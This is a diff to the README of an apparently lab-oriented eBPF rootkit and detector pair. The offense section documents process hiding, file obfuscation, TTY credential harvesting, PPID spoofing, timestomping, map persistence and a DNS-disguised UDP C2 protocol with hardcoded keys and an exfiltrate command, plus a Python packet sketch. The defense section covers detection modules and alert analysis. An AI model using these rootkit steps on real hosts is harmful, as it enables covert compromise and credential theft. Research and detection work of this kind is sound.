@@ -63,9 +63,22 @@ cargo build
 ### Basic Usage
 
 ```bash
-# Start the rootkit with default settings
+# Start the rootkit with default settings (loads all 13 features)
 sudo ./target/release/offense --iface eth0
 ```
+
+### CLI Flags
+
+| Flag | Description |
+|---|---|
+| `--iface <name>` | Network interface for XDP/TC attachment (required) |
+| `--verbose` | Enable debug-level logging |
+| `--hide-pid <pid>` | Add a PID to the hidden process list on startup |
+| `--obfuscate-inode <inode>` | Add an inode to the file obfuscation list |
+| `--monitor-tty <major:minor>` | Monitor a TTY device for credential harvesting |
+| `--spoof-ppid <pid:fake_ppid>` | Spoof a process's parent PID |
+| `--timestomp <inode:atime:mtime:ctime>` | Set fake timestamps (epoch seconds) |
+| `--pin-maps` | Pin BPF maps to `/sys/fs/bpf/shadow` for persistence |
 
 ### Feature-Specific Examples
 
@@ -101,7 +114,7 @@ sudo ./target/release/offense --iface eth0 --spoof-ppid 1234:1
 
 #### 5. Timestomping
 ```bash
-# Fake timestamps (format: inode:atime:mtime:ctime)
+# Fake timestamps (format: inode:atime:mtime:ctime in epoch seconds)
 INODE=$(stat -c %i /path/to/file.txt)
 sudo ./target/release/offense --iface eth0 \
     --timestomp $INODE:1609459200:1609459200:1609459200
@@ -109,25 +122,31 @@ sudo ./target/release/offense --iface eth0 \
 
 #### 6. Map Persistence
 ```bash
-# Pin BPF maps to filesystem for persistence
+# Pin BPF maps to filesystem for persistence across loader restarts
 sudo ./target/release/offense --iface eth0 --pin-maps
 
-# Maps will be available at /sys/fs/bpf/aegis_shadow/
+# Maps will be available at /sys/fs/bpf/shadow
 ```
 
 ### Network C2 Commands
 
-The rootkit listens for UDP packets on port 53 with the following format:
+The rootkit listens for UDP packets on port 53 (disguised as DNS) with the following format:
 
 ```
-[4 bytes: MAGIC_BYTES] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: MAC]
+[4 bytes: MAGIC 0xDEADBEEF] [12 bytes: nonce] [16 bytes: encrypted payload] [16 bytes: HMAC]
 ```
+
+**Encryption**: ChaCha20 with a 256-bit key and 96-bit nonce.
+**Authentication**: Truncated HMAC-SHA256 (16 bytes) verified before command execution.
 
 **Command Types:**
-- `cmd_type=1`: Hide PID (arg1=PID)
-- `cmd_type=2`: Unhide PID (arg1=PID)
-- `cmd_type=3`: Obfuscate file (arg1=inode)
-- `cmd_type=5`: Reserved for future use
+| cmd_type | Action | arg1 | arg2 |
+|---|---|---|---|
+| 1 | Hide PID | PID to hide | unused |
+| 2 | Unhide PID | PID to unhide | unused |
+| 3 | Obfuscate file | inode number | unused |
+| 4 | Exfiltrate data | context-dependent | unused |
+| 5 | Kill switch | unused | unused |
 
 **Example C2 Packet (Python):**
 ```python
@@ -135,7 +154,8 @@ import socket
 import struct
 
 MAGIC = b'\xDE\xAD\xBE\xEF'
-KEY = b'0123456789abcdef0123456789abcdef'  # 32 bytes
+KEY = b'AEGIS-SHADOW-CHACHA20-KEY-000001'  # 32 bytes
+HMAC_KEY = b'AEGIS-SHADOWKEY1'  # 16 bytes
 
 # Command: Hide PID 1234
 cmd_type = 1
@@ -143,7 +163,7 @@ arg1 = 1234
 arg2 = 0
 
 payload = struct.pack('<III', cmd_type, arg1, arg2)
-# Add encryption and MAC here...
+# Add ChaCha20 encryption and HMAC-SHA256 here...
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.sendto(MAGIC + nonce + encrypted + mac, ('target_ip', 53))
@@ -153,7 +173,8 @@ sock.sendto(MAGIC + nonce + encrypted + mac, ('target_ip', 53))
 
 ```bash
 # Press Ctrl+C in the terminal running the offense loader
-# Or kill the process
+# The kill switch C2 command (cmd_type=5) also triggers graceful shutdown
+# Or kill the process:
 sudo pkill -9 offense
 ```
 
@@ -172,6 +193,22 @@ sudo ./target/release/defense --all-modules --verbose
 sudo ./target/release/defense --all-modules --output /tmp/alerts.json
 ```
 
+### CLI Flags
+
+| Flag | Description |
+|---|---|
+| `--verbose` / `-v` | Enable debug-level logging |
+| `--output` / `-o` | Path to write JSON alert records |
+| `--threshold` / `-t` | Alert severity threshold: 1=Low, 2=Medium (default), 3=High, 4=Critical |
+| `--all-modules` | Enable all 5 detection modules |
+| `--ghost-maps` | Enable ghost map detection |
+| `--syscall-latency` | Enable syscall latency monitoring |
+| `--bytecode-check` | Enable bytecode integrity checking |
+| `--hidden-process` | Enable hidden process detection |
+| `--suspicious-hooks` | Enable suspicious hook detection |
+| `--calibration-period` | Baseline calibration duration in seconds (default: 60) |
+| `--config` | Path to runtime config JSON file (hot-reloaded every 5s) |
+
 ### Module-Specific Detection
 
 ```bash
@@ -184,9 +221,45 @@ sudo ./target/release/defense \
 # Set alert threshold (1=Low, 2=Medium, 3=High, 4=Critical)
 sudo ./target/release/defense --all-modules --threshold 3
 
-# Custom calibration period (default: 60 seconds)
+# Custom calibration period
 sudo ./target/release/defense --all-modules --calibration-period 120
 ```
+
+### Runtime Configuration (Hot-Reload)
+
+The defense engine can reload its configuration without restarting. Create a JSON config file:
+
+```json
+{
+  "threshold": 2,
+  "window_secs": 30
+}
+```
+
+Start the engine with `--config`:
+
+```bash
+sudo ./target/release/defense --all-modules --config /etc/aegis/config.json
+```
+
+The engine polls the file every 5 seconds. To change detection sensitivity at runtime:
+
+```bash
+# Increase sensitivity (lower threshold, wider window)
+echo '{"threshold": 1, "window_secs": 60}' > /etc/aegis/config.json
+
+# Decrease sensitivity (only critical alerts, narrow window)
+echo '{"threshold": 4, "window_secs": 10}' > /etc/aegis/config.json
+```
+
+### DefenseEngine Intelligence
+
+The engine provides more than raw alert forwarding:
+
+- **Calibration**: During the initial calibration period, the engine collects baseline alert rates per type. After calibration completes, anomaly scoring activates.
+- **Anomaly Scoring**: Each alert's rate (per PID, within the sliding window) is compared to the calibrated baseline. A score >= 10.0 escalates severity to CRITICAL.
+- **Attack Chain Detection**: When a single PID triggers 3 or more distinct alert types within the sliding window, the engine flags the alerts as a correlated attack chain.
+- **Metrics**: On shutdown (Ctrl+C), the engine prints a summary: alerts processed, alerts suppressed (below threshold), attack chains detected, anomaly escalations, and a per-type breakdown.
 
 ### Analyzing Alerts
 
@@ -200,8 +273,14 @@ jq '.alert_type' /tmp/alerts.json | sort | uniq -c
 # Filter by severity
 jq 'select(.severity == "HIGH")' /tmp/alerts.json
 
+# Find attack chains
+jq 'select(.is_attack_chain == true)' /tmp/alerts.json
+
 # Get alert timeline
 jq -r '[.timestamp, .alert_type, .pid] | @tsv' /tmp/alerts.json
+
+# Show anomaly scores above threshold
+jq 'select(.anomaly_score > 5.0)' /tmp/alerts.json
 ```
 
 ## Testing
@@ -209,10 +288,13 @@ jq -r '[.timestamp, .alert_type, .pid] | @tsv' /tmp/alerts.json
 ### Automated Tests
 
 ```bash
-# Run offense test suite
+# Run integration tests (user-space, no root required)
+cargo test -p integration-tests
+
+# Run offense test suite (requires root, in VM)
 sudo ./tests/test_offense.sh
 
-# Run defense test suite
+# Run defense test suite (requires root, in VM)
 sudo ./tests/test_defense.sh
 
 # Run all tests via Makefile
@@ -318,8 +400,8 @@ sudo dmesg | grep -i bpf
 # Disable verbose logging
 ./target/release/offense --iface eth0  # No --verbose flag
 
-# Limit event monitoring
-# Edit source to reduce PerfEventArray buffer size
+# Use higher threshold to reduce alert volume
+./target/release/defense --all-modules --threshold 3
 ```
 
 ### Optimize for Production
@@ -333,7 +415,7 @@ RUSTFLAGS="-C target-cpu=native" cargo build --release
 
 ## Security Warnings
 
-⚠️ **CRITICAL WARNINGS:**
+**CRITICAL WARNINGS:**
 
 1. **Legal Use Only**: This tool is for authorized security research and testing only
 2. **Controlled Environment**: Only use in isolated lab environments
@@ -349,7 +431,7 @@ sudo pkill -9 offense
 sudo pkill -9 defense
 
 # Remove pinned maps
-sudo rm -rf /sys/fs/bpf/aegis_shadow/
+sudo rm -rf /sys/fs/bpf/shadow
 
 # Detach XDP/TC programs
 sudo ip link set dev eth0 xdp off
@@ -357,21 +439,6 @@ sudo tc filter del dev eth0 egress
 
 # Clean build artifacts
 make clean
-```
-
-## Advanced Usage
-
-### Custom C2 Server
-See `examples/c2_server.py` for a reference implementation.
-
-### Kernel Module Integration
-The rootkit can coexist with kernel modules for enhanced stealth.
-
-### Multi-Interface Deployment
-```bash
-# Attach to multiple interfaces
-sudo ./target/release/offense --iface eth0 &
-sudo ./target/release/offense --iface wlan0 &
 ```
 
 ## Support
